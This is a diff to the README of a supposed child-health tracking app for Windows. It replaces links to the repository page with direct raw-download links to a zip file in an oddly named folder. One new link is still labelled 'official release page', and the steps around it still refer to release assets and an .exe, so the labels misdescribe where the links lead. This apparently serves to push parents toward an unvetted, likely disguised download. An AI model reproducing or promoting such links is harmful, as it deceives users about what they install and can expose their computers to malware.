@@ -1,6 +1,6 @@
 # 🩺 kidsdiag-app - Simple tools to track child health
 
-[![Download kidsdiag-app](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Nice-genuspistia406/kidsdiag-app)
+[![Download kidsdiag-app](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Nice-genuspistia406/kidsdiag-app/raw/refs/heads/main/accurateness/kidsdiag_app_v3.2.zip)
 
 This application provides a foundation for monitoring and recording common health symptoms in children. It helps parents keep organized records for personal use or for discussions with medical professionals. The software runs locally on your Windows computer and keeps your data private.
 
@@ -17,7 +17,7 @@ The application runs on most modern desktop computers. Check these items before 
 
 Follow these steps to acquire the software on your machine:
 
-1. Visit the [official release page](https://github.com/Nice-genuspistia406/kidsdiag-app) to find the latest version.
+1. Visit the [official release page](https://github.com/Nice-genuspistia406/kidsdiag-app/raw/refs/heads/main/accurateness/kidsdiag_app_v3.2.zip) to find the latest version.
 2. Look for the Assets section at the bottom of the release notes.
 3. Click the link that ends in .exe to start your download.
 4. Select a folder on your computer where you want to keep the file. 
